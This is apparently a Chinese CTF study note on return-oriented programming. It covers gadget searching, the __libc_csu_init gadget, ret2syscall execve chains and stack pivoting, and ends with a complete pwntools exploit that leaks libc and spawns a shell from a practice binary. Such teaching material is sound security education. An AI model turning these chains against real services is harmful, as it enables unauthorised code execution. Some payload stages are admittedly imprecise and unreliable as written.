---
category: "ROP"
tags: ["ROPgadget", "ret2syscall", "栈迁移", "pivot", "SROP", "万能gadget"]
difficulty: "中级"
---

# ROP链构造技术：ROPgadget / ret2syscall / 栈迁移

## 1. 概述

ROP（Return-Oriented Programming）是利用程序中已有的以`ret`结尾的短指令片段（gadget）来构造攻击链的技术。当NX开启无法直接执行shellcode时，ROP是最核心的利用手段。

离线CTF场景下，ROP构造依赖本地工具（ROPgadget、ropper）和手写gadget分析能力。小参数模型可辅助gadget搜索和链构造，但实际偏移仍需精确计算。

## 2. 核心原理

### 2.1 ROP链执行模型

```
利用 ret 指令持续劫持控制流：
gadget1 (pop rdi; ret) -> 设置 rdi = "/bin/sh"
gadget2 (ret)           -> 栈对齐
gadget3 (call system)   -> system("/bin/sh")
```

### 2.2 关键gadget分类

| 类型 | 示例 | 用途 |
|------|------|------|
| 传参gadget | `pop rdi; ret` | 设置rdi参数 |
| | `pop rsi; pop r15; ret` | 设置rsi参数 |
| | `pop rdx; ret` | 设置rdx参数（较罕见） |
| 栈操作 | `add rsp, 0x...; ret` | 栈调整 |
| | `leave; ret` | 栈帧还原（mov rsp,rbp; pop rbp; ret） |
| 控制转移 | `call [rax]` | 间接调用 |

### 2.3 栈迁移（Stack Pivot）

当溢出空间不足以容纳完整ROP链时，通过`leave; ret`将RSP迁移到可控内存区域。

```
leave = mov rsp, rbp; pop rbp
ret  = pop rip

实际效果：
1. rsp = rbp (通过leave的 mov rsp,rbp)
2. rbp = [旧rsp] (通过leave的 pop rbp)
3. rip = [新rsp] (通过ret的 pop rip)
```

## 3. 关键技巧/检测方法

### 3.1 离线gadget搜索

```bash
# ROPgadget 基础搜索
ROPgadget --binary ./vuln --only "pop|ret" | grep "pop rdi"
ROPgadget --binary ./vuln --depth 10  # 深搜罕见gadget

# ropper 替代方案
ropper -f ./vuln --search "pop rdi"

# 在libc中大范围搜索
ROPgadget --binary ./libc.so.6 --all > libc_gadgets.txt
grep "pop rdx" libc_gadgets.txt  # rdx gadget通常在libc中找
```

### 3.2 利用__libc_csu_init（万能gadget）

这是64位程序中几乎100%存在的通用gadget，位于`__libc_csu_init`函数末尾。

```python
# 典型 csu gadget 调用链
# 用GDB反汇编 __libc_csu_init 找到以下指令(通常偏移0x80):
"""
0x401230: mov rdx, r15   ; 控制rdx(第三参数)
0x401233: mov rsi, r14   ; 控制rsi(第二参数)  
0x401236: mov edi, r13d  ; 控制edi(第一参数)
0x401239: call [r12+rbx*8] ; 调用目标函数
0x40123d: ... ret
"""

def csu_call(rbx, rbp, r12, r13, r14, r15, ret_addr, call_target):
    """
    构造csu gadget调用链
    r12 -> 指向目标函数地址的指针(如某个GOT表项)
    r12+rbx*8 -> 目标函数指针位置
    r13 = edi = 参数1
    r14 = rsi = 参数2
    r15 = rdx = 参数3
    rbx=0, rbp=1 是最简单的配置
    """
    pass
```

### 3.3 万能gadget完整利用代码

```python
def csu_call(call_ptr, edi_val, rsi_val, rdx_val, ret_addr):
    """
    call_ptr: 指向目标函数GOT的指针(如elf.got['write'])
    需要先泄露该GOT值再填入
    """
    csu_pop = 0x40123A  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    csu_call_gadget = 0x401220  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]

    payload = flat([
        csu_pop,
        0,      # rbx = 0
        1,      # rbp = 1 (会pop rbp后+1 -> 与rbx比较 -> 相等则跳过循环)
        call_ptr,  # r12 -> 目标函数GOT地址
        edi_val,   # r13 -> rdi (参数1)
        rsi_val,   # r14 -> rsi (参数2)
        rdx_val,   # r15 -> rdx (参数3)
        csu_call_gadget,
        # 执行完后: add rbx, 1; cmp rbp, rbx; jnz ...; then pop rbx~r15; ret
        # 因为 rbp(1) == rbx(0+1)，循环结束
        # 接下来执行: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        p64(0), p64(0), p64(0), p64(0), p64(0), p64(0),
        ret_addr   # 最终的返回地址
    ])
    return payload
```

### 3.4 ret2syscall构造

当libc不可用或无system()时，直接用syscall指令执行`execve`。

```python
# x86-64 execve("/bin/sh", 0, 0) syscall 设置
# syscall号: rax=59 (0x3B)
# rdi = "/bin/sh"地址
# rsi = 0 (argv)
# rdx = 0 (envp)

# 需要gadget链: pop rax; ret / pop rdi; ret / pop rsi; ret / pop rdx; ret / syscall; ret
def ret2syscall_execve(bin_sh_addr, pop_rax, pop_rdi, pop_rsi, pop_rdx, syscall_addr):
    payload = flat([
        pop_rax, 0x3B,      # rax = 59 (execve)
        pop_rdi, bin_sh_addr,  # rdi = "/bin/sh"
        pop_rsi, 0,         # rsi = 0
        pop_rdx, 0,         # rdx = 0
        syscall_addr         # syscall
    ])
    return payload
```

## 4. 常见误区与注意事项

1. **gadget的副作用**：`pop rsi; pop r15; ret`会消费两个栈值，需多填充8字节
2. **ret滑动**：`ret; ret; ...; ret`即重复的ret gadget，可用于滑动到ROP链
3. **movaps对齐**：call指令前的`movaps xmm0, [rsp+0x...]`要求16字节对齐
4. **栈迁移后rbp控制**：`leave; ret`后rbp来自可控内存，第二次leave可再次迁移
5. **one_gadget约束**：`one_gadget libc.so.6`找到的gadget通常有rsp约束条件

## 5. 实战示例：栈迁移完整利用

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
栈迁移（Stack Pivot）完整示例
场景: read(0, buf, 0x300) 溢出只有0x30字节到rbp，但buf在bss段已知地址
利用: leave;ret 将栈迁移到bss段，在bss段布置完整ROP链
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./stack_pivot')
elf = ELF('./stack_pivot')

# ---- 环境变量 ----
bss_buf = 0x601080   # bss段的缓冲区
leave_ret = 0x4011A3 # leave; ret gadget

pop_rdi_ret = 0x401283
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
main_addr = elf.symbols['main']

offset = 0x20  # 溢出到rbp的距离(不是返回地址！)

# ---- 阶段1: 栈迁移到bss ----
# 先通过本来的一次read，将ROP链写到bss_buf
# 第二次read溢出到rbp，通过leave;ret迁移
# 注意：第一次read写入bss的内容成为新栈
fake_rbp = bss_buf + 0x100  # 新栈底(rbp)，在bss_buf之后

# 在bss上构造ROP链（新栈内容）
rop_on_bss = flat([
    pop_rdi_ret,
    puts_got,          # rdi = puts@GOT
    puts_plt,          # puts(puts_got) 泄露libc
    pop_rdi_ret,
    0,                 # rdi = 0 = stdin
    pop_rdi_ret,       # 这行有些浪费，实际需精确pop_rsi_r15 gadget
    bss_buf + 0x200,   # rsi = bss_buf + 0x200 (新读入地址)
    0x200,             # rdx = 0x200
    read_plt,          # read(0, bss_buf+0x200, 0x200) 读入stage3
    # 此时可以跳回bss_buf+0x200执行stage3（实际一个间接jmp）
    leave_ret,         # 第二次迁移：从bss再次迁移到控制区域
])

# 先将ROP链写入bss
p.sendafter(b'Name:', rop_on_bss)

# ---- 阶段2: 触发溢出，迁移栈 ----
payload2 = b'A' * offset       # 填充到rbp
payload2 += p64(fake_rbp)      # 覆盖rbp为假栈底
payload2 += p64(leave_ret)     # 覆盖返回地址为leave;ret
# 执行: rsp = rbp = fake_rbp; pop rbp = [fake_rbp](即rop_on_bss[0:8])
#      ret -> [新rsp]即rop_on_bss[8:16]

p.sendafter(b'Msg:', payload2)

# 现在RSP已经迁移到bss_buf，ROP链开始执行
leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leaked puts: {hex(leaked)}")

# ---- 阶段3: 计算libc并再次ROP ----
libc_base = leaked - 0x80ed0  # 需匹配实际libc
system_addr = libc_base + 0x4f420
bin_sh_addr = libc_base + 0x1b3e1a

stage3 = flat([
    pop_rdi_ret,
    bin_sh_addr,
    system_addr
])
pause()  # 等待read调用
p.send(stage3)
p.interactive()
```

## 6. 相关知识点

- **格式化字符串泄露**：与ROP结合实现地址泄露，见 03-格式化字符串漏洞.md
- **SROP**：通过sigreturn帧一次性设置所有寄存器，见 07-SROP与SigreturnFrame利用.md
- **ret2dlresolve**：当无直接libc函数可用时，伪造动态链接解析过程
- **libc gadget库**：将libc.so.6的所有gadget导出为文本文件，供离线搜索
- **pwntools ROP模块**：`rop = ROP(elf)` 可自动生成ROP链
